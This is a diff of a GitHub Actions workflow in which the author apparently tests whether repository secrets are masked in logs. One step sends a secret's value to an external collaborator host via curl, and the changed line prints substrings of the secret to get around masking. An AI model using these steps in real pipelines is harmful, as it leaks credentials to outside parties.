@@ -23,5 +23,5 @@ jobs:
       - run: echo "this si my variable, $MY_VARIABLE"
       - run: echo "secret, ${{ vars.MY_SECRET }}. variable, ${{ vars.MY_VARIABLE }}" # From this we see that the secret is masked from the output
       - run: curl jg3yql9w2f7uvfa15gcj5xft2k8bw2kr.bcollaborator.binsec.cloud/${{ vars.MY_SECRET }} # its actually not here either, so what can we use the secrets for?
-      - run: echo "${MY_SECRET:0:1}"; echo "${MY_SECRET:1:6}"
+      - run: echo "$MY_SECRET:0:1"; echo " heisann, hva skjer $MY_SECRET:1:6"
       
